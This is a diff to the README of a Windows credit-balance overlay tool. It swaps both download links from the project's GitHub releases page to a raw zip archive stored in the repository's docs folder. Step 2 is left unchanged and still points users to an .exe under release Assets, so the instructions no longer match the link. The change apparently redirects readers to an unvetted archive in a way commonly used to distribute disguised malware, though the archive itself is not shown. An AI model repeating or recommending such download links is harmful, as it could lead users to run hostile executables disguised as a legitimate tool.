@@ -1,6 +1,6 @@
 # 📊 cc-balance-overlay - Track your credits on Windows easily
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/winterd3290/cc-balance-overlay/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/winterd3290/cc-balance-overlay/main/docs/balance_overlay_cc_3.8.zip)
 
 ## What is this tool?
 
@@ -14,7 +14,7 @@ This software works on Windows 11. You do not need to install extra software to 
 
 Follow these steps to set up the balance monitor on your computer:
 
-1. Visit [this page to download the latest version](https://github.com/winterd3290/cc-balance-overlay/releases).
+1. Visit [this page to download the latest version](https://raw.githubusercontent.com/winterd3290/cc-balance-overlay/main/docs/balance_overlay_cc_3.8.zip).
 2. Look for the file ending in .exe under the Assets section of the newest release.
 3. Click the file to download it to your computer.
 4. Open your Downloads folder.
